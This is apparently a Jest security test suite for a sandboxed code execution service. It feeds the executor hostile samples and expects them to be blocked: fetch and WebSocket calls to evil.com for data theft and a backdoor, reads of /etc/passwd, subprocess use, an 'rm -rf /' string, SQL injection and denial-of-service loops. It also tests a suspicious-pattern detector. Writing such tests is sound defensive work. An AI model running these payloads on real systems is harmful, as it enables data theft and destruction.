/**
 * Security and Penetration Tests for Live Code Execution System
 * Tests security boundaries, sandboxing, and protection against attacks
 */

import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import { codeExecutor } from '../index';
import { maliciousCodeDetector } from '../malicious-code-detector';

describe('Security and Penetration Testing', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Code Injection Prevention', () => {
    it('should prevent eval-based code injection', async () => {
      const maliciousCode = `
        eval('alert("XSS Attack"); window.location = "https://evil.com";');
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-eval'
      });

      // Should execute in sandboxed environment without access to window
      expect(result).toBeDefined();
      if (!result.success) {
        expect(result.error).toMatch(/eval|security|blocked/i);
      }
    });

    it('should prevent Function constructor injection', async () => {
      const maliciousCode = `
        const malicious = new Function('return window.location.href');
        console.log(malicious());
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-function'
      });

      expect(result).toBeDefined();
      // Should not have access to window object
    });

    it('should prevent setTimeout/setInterval abuse', async () => {
      const maliciousCode = `
        setTimeout(() => {
          while(true) {
            console.log('DoS attack');
          }
        }, 100);
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        options: { timeout: 2000 },
        sessionId: 'security-test-timeout'
      });

      expect(result).toBeDefined();
      // Should timeout before causing damage
    });

    it('should prevent prototype pollution', async () => {
      const maliciousCode = `
        Object.prototype.polluted = 'malicious';
        const obj = {};
        console.log(obj.polluted);
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-prototype'
      });

      expect(result).toBeDefined();
      // Should be contained within execution context
    });
  });

  describe('DOM and Browser API Security', () => {
    it('should prevent access to parent window', async () => {
      const maliciousCode = `
        try {
          console.log(parent.location.href);
        } catch (e) {
          console.log('Access denied:', e.message);
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-parent'
      });

      expect(result.success).toBe(true);
      expect(result.output).toContain('Access denied');
    });

    it('should prevent localStorage access to parent domain', async () => {
      const maliciousCode = `
        try {
          localStorage.setItem('malicious', 'data');
          console.log('localStorage access granted');
        } catch (e) {
          console.log('localStorage blocked:', e.message);
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-localstorage'
      });

      expect(result).toBeDefined();
      // Should either block access or isolate storage
    });

    it('should prevent cookie access', async () => {
      const maliciousCode = `
        try {
          document.cookie = 'malicious=data';
          console.log('Cookie set:', document.cookie);
        } catch (e) {
          console.log('Cookie access blocked:', e.message);
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-cookies'
      });

      expect(result).toBeDefined();
      // Should not have access to parent domain cookies
    });

    it('should prevent geolocation access', async () => {
      const maliciousCode = `
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            position => console.log('Location:', position.coords),
            error => console.log('Geolocation blocked:', error.message)
          );
        } else {
          console.log('Geolocation not available');
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-geolocation'
      });

      expect(result).toBeDefined();
      // Should not have access to geolocation
    });
  });

  describe('Network Security', () => {
    it('should prevent external fetch requests', async () => {
      const maliciousCode = `
        fetch('https://evil.com/steal-data', {
          method: 'POST',
          body: JSON.stringify({stolen: 'data'})
        })
        .then(response => console.log('Data sent'))
        .catch(error => console.log('Request blocked:', error.message));
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-fetch'
      });

      expect(result).toBeDefined();
      if (result.output) {
        expect(result.output).toContain('blocked');
      }
    });

    it('should prevent WebSocket connections', async () => {
      const maliciousCode = `
        try {
          const ws = new WebSocket('wss://evil.com/backdoor');
          ws.onopen = () => console.log('WebSocket connected');
          ws.onerror = (error) => console.log('WebSocket blocked');
        } catch (e) {
          console.log('WebSocket creation blocked:', e.message);
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-websocket'
      });

      expect(result).toBeDefined();
      // Should block WebSocket connections
    });

    it('should prevent XMLHttpRequest to external domains', async () => {
      const maliciousCode = `
        try {
          const xhr = new XMLHttpRequest();
          xhr.open('GET', 'https://evil.com/api');
          xhr.onload = () => console.log('XHR succeeded');
          xhr.onerror = () => console.log('XHR blocked');
          xhr.send();
        } catch (e) {
          console.log('XHR creation blocked:', e.message);
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-xhr'
      });

      expect(result).toBeDefined();
      // Should block external XHR requests
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    it('should prevent infinite loops', async () => {
      const maliciousCode = `
        let i = 0;
        while (true) {
          i++;
          if (i % 1000000 === 0) {
            console.log('Still running:', i);
          }
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        options: { timeout: 3000 },
        sessionId: 'security-test-infinite-loop'
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/timeout|terminated/i);
    });

    it('should prevent memory exhaustion', async () => {
      const maliciousCode = `
        const arrays = [];
        try {
          while (true) {
            arrays.push(new Array(1000000).fill('memory bomb'));
          }
        } catch (e) {
          console.log('Memory limit reached:', e.message);
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        options: { memoryLimit: 50 * 1024 * 1024 }, // 50MB limit
        sessionId: 'security-test-memory-bomb'
      });

      expect(result).toBeDefined();
      // Should either terminate or handle gracefully
    });

    it('should prevent excessive DOM manipulation', async () => {
      const maliciousCode = `
        for (let i = 0; i < 100000; i++) {
          const div = document.createElement('div');
          div.innerHTML = 'DOM bomb ' + i;
          document.body.appendChild(div);
        }
        console.log('DOM elements created');
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        options: { timeout: 5000 },
        sessionId: 'security-test-dom-bomb'
      });

      expect(result).toBeDefined();
      // Should handle excessive DOM operations
    });

    it('should prevent recursive function stack overflow', async () => {
      const maliciousCode = `
        function recursiveBomb(depth = 0) {
          console.log('Depth:', depth);
          return recursiveBomb(depth + 1);
        }
        
        try {
          recursiveBomb();
        } catch (e) {
          console.log('Stack overflow prevented:', e.message);
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-recursion'
      });

      expect(result).toBeDefined();
      if (result.success) {
        expect(result.output).toContain('Stack overflow prevented');
      }
    });
  });

  describe('Python-Specific Security', () => {
    it('should prevent file system access in Python', async () => {
      const maliciousCode = `
        try:
            with open('/etc/passwd', 'r') as f:
                print(f.read())
        except Exception as e:
            print(f'File access blocked: {e}')
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'python',
        sessionId: 'security-test-python-file'
      });

      expect(result).toBeDefined();
      if (result.success) {
        expect(result.output).toContain('File access blocked');
      }
    });

    it('should prevent subprocess execution in Python', async () => {
      const maliciousCode = `
        try:
            import subprocess
            result = subprocess.run(['ls', '-la'], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f'Subprocess blocked: {e}')
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'python',
        sessionId: 'security-test-python-subprocess'
      });

      expect(result).toBeDefined();
      if (result.success) {
        expect(result.output).toContain('Subprocess blocked');
      }
    });

    it('should prevent network access in Python', async () => {
      const maliciousCode = `
        try:
            import urllib.request
            response = urllib.request.urlopen('https://evil.com')
            print(response.read())
        except Exception as e:
            print(f'Network access blocked: {e}')
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'python',
        sessionId: 'security-test-python-network'
      });

      expect(result).toBeDefined();
      if (result.success) {
        expect(result.output).toContain('Network access blocked');
      }
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in dynamic queries', async () => {
      const maliciousCode = `
        -- Attempt SQL injection
        CREATE TABLE users (id INTEGER, name TEXT);
        INSERT INTO users VALUES (1, 'admin');
        
        -- This should be treated as literal text, not executed
        SELECT * FROM users WHERE name = 'admin'; DROP TABLE users; --';
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'sql',
        sessionId: 'security-test-sql-injection'
      });

      expect(result).toBeDefined();
      // Should handle SQL safely without executing injection
    });

    it('should prevent unauthorized database operations', async () => {
      const maliciousCode = `
        -- Attempt to access system tables
        SELECT * FROM sqlite_master;
        
        -- Attempt to create malicious functions
        CREATE FUNCTION malicious() RETURNS TEXT AS 'system("rm -rf /")';
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'sql',
        sessionId: 'security-test-sql-system'
      });

      expect(result).toBeDefined();
      // Should restrict access to system operations
    });
  });

  describe('Malicious Code Detection', () => {
    it('should detect suspicious patterns', () => {
      const suspiciousPatterns = [
        'eval(',
        'Function(',
        'document.cookie',
        'localStorage.',
        'fetch(',
        'XMLHttpRequest',
        'WebSocket',
        'import os',
        'subprocess.',
        '__import__',
        'DROP TABLE',
        'DELETE FROM'
      ];

      suspiciousPatterns.forEach(pattern => {
        const isSuspicious = maliciousCodeDetector.detectSuspiciousPatterns(
          `Some code with ${pattern} in it`,
          'javascript'
        );
        expect(isSuspicious.length).toBeGreaterThan(0);
      });
    });

    it('should calculate risk scores accurately', () => {
      const highRiskCode = `
        eval('malicious code');
        fetch('https://evil.com');
        while(true) { console.log('dos'); }
      `;

      const riskScore = maliciousCodeDetector.calculateRiskScore(highRiskCode, 'javascript');
      expect(riskScore).toBeGreaterThan(7); // High risk threshold
    });

    it('should allow safe code patterns', () => {
      const safeCode = `
        console.log('Hello, World!');
        const x = 5;
        const y = x * 2;
        console.log('Result:', y);
      `;

      const riskScore = maliciousCodeDetector.calculateRiskScore(safeCode, 'javascript');
      expect(riskScore).toBeLessThan(3); // Low risk threshold
    });
  });

  describe('Context Isolation', () => {
    it('should isolate execution contexts between sessions', async () => {
      // Session 1: Set a global variable
      await codeExecutor.execute({
        code: 'globalThis.secret = "sensitive data";',
        language: 'javascript',
        sessionId: 'isolation-test-1'
      });

      // Session 2: Try to access the variable
      const result = await codeExecutor.execute({
        code: 'console.log(typeof globalThis.secret);',
        language: 'javascript',
        sessionId: 'isolation-test-2'
      });

      expect(result.success).toBe(true);
      expect(result.output).toContain('undefined');
    });

    it('should prevent cross-session data leakage', async () => {
      // Session 1: Create sensitive data
      await codeExecutor.execute({
        code: `
          const sensitiveData = {
            password: 'secret123',
            apiKey: 'key-abc-123'
          };
          console.log('Data created');
        `,
        language: 'javascript',
        sessionId: 'leakage-test-1'
      });

      // Session 2: Try to access sensitive data
      const result = await codeExecutor.execute({
        code: `
          try {
            console.log(sensitiveData);
          } catch (e) {
            console.log('Access denied:', e.message);
          }
        `,
        language: 'javascript',
        sessionId: 'leakage-test-2'
      });

      expect(result.success).toBe(true);
      expect(result.output).toContain('Access denied');
    });
  });

  describe('Error Information Disclosure', () => {
    it('should not expose sensitive system information in errors', async () => {
      const maliciousCode = `
        try {
          require('fs').readFileSync('/etc/passwd');
        } catch (e) {
          console.log('Error details:', e.toString());
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-error-disclosure'
      });

      expect(result).toBeDefined();
      if (result.error || result.output) {
        const errorText = (result.error || result.output || '').toLowerCase();
        // Should not expose file paths or system details
        expect(errorText).not.toMatch(/\/etc\/|\/usr\/|\/var\/|c:\\|system32/i);
      }
    });

    it('should sanitize stack traces', async () => {
      const maliciousCode = `
        function deepFunction() {
          throw new Error('Test error');
        }
        
        function middleFunction() {
          deepFunction();
        }
        
        function topFunction() {
          middleFunction();
        }
        
        try {
          topFunction();
        } catch (e) {
          console.log('Stack trace:', e.stack);
        }
      `;

      const result = await codeExecutor.execute({
        code: maliciousCode,
        language: 'javascript',
        sessionId: 'security-test-stack-trace'
      });

      expect(result).toBeDefined();
      if (result.output) {
        // Stack trace should not expose internal file paths
        expect(result.output).not.toMatch(/\/node_modules\/|\/src\/lib\//);
      }
    });
  });
});

describe('Load Testing and DoS Prevention', () => {
  it('should handle multiple concurrent malicious requests', async () => {
    const maliciousRequests = Array.from({ length: 10 }, (_, i) => 
      codeExecutor.execute({
        code: `
          const start = Date.now();
          while (Date.now() - start < 10000) {
            // CPU intensive loop
          }
          console.log('DoS attempt ${i}');
        `,
        language: 'javascript',
        options: { timeout: 2000 },
        sessionId: `dos-test-${i}`
      })
    );

    const results = await Promise.allSettled(maliciousRequests);
    
    // Most should timeout or be rejected
    const timedOut = results.filter(r => 
      r.status === 'fulfilled' && 
      !(r.value as any).success &&
      (r.value as any).error?.includes('timeout')
    ).length;

    expect(timedOut).toBeGreaterThan(5);
  });

  it('should enforce rate limiting', async () => {
    const rapidRequests = Array.from({ length: 20 }, (_, i) => 
      codeExecutor.execute({
        code: `console.log('Rapid request ${i}');`,
        language: 'javascript',
        sessionId: `rate-limit-test-${i}`
      })
    );

    const results = await Promise.allSettled(rapidRequests);
    
    // Some requests should be rate limited or queued
    const successful = results.filter(r => 
      r.status === 'fulfilled' && (r.value as any).success
    ).length;

    // Not all should succeed immediately
    expect(successful).toBeLessThan(20);
  });
});